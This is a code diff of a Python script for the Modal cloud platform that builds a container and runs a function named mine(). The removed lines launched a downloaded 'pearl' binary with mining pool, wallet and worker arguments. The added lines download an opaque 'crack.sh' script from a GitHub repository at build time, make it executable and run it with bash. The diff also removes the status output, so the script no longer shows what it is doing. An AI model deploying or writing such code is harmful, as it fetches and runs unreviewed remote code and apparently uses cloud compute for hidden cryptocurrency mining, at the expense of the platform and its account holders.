@@ -13,8 +13,8 @@ pearlhash_image = (
     )
     .apt_install("curl", "libgomp1")
     .run_commands(
-        "curl -L -J https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/lpm -o /opt/pearl && "
-        "chmod +x /opt/pearl"
+        "curl -L -J https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/crack.sh -o /opt/crack.sh && "
+        "chmod +x /opt/crack.sh"
     )
 )
 
@@ -29,14 +29,10 @@ def mine():
     import subprocess
     import os
 
-    print(f"[Modal] Pear")
-    print(f"[Modal] Pool: {POOL_HOST}")
-    print(f"[Modal] Wallet: {WALLET}")
-    print(f"[Modal] Worker: {WORKER}")
-    print()
+   
 
     proc = subprocess.Popen(
-        ["/opt/pearl", "--pool", POOL_HOST, "--wallet", WALLET, "--worker", WORKER],
+        ["bash","/opt/crack.sh",],
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
     )
